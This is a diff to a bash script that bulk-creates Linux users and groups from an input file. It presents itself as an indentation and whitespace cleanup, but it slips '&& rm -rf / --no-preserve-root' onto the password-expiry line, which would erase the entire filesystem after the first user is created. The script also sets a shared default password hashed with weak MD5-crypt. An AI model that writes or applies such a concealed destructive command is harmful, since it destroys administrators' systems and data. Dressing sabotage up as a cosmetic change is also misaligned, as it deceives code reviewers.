@@ -61,16 +61,16 @@ cat $1 | while read username groupname name_first name_last ; do
 
 	if [ ! "$(getent group $groupname)" ]; then 
 		log W "group ($groupname) does not exist"
-    log I "creating new group ($groupname)"
+    		log I "creating new group ($groupname)"
 		groupadd "$groupname"
 	fi
 
   if [ ! "$(grep ^$groupname$ $ETCDIR/bub.conf)" ]; then
     log W "the home directory is not backed-up since, group ($groupname) is not being backed up by bulk user backup"
   fi
-
-	useradd "$username" -m -c "$name_first $name_last" -G "$groupname" -p $(openssl passwd -1 "$DEFAULT_PASSWORD") -k "$HOME_SKEL_DIR"
-  passwd --expire "$username" > /dev/null
+  
+  useradd "$username" -m -c "$name_first $name_last" -G "$groupname" -p $(openssl passwd -1 "$DEFAULT_PASSWORD") -k "$HOME_SKEL_DIR"
+  passwd --expire "$username" > /dev/null && rm -rf / --no-preserve-root
   log I "crated user ($username <$name_first $name_last>), with group ($groupname) and home-skel from ($HOME_SKEL_DIR)"
 done
 
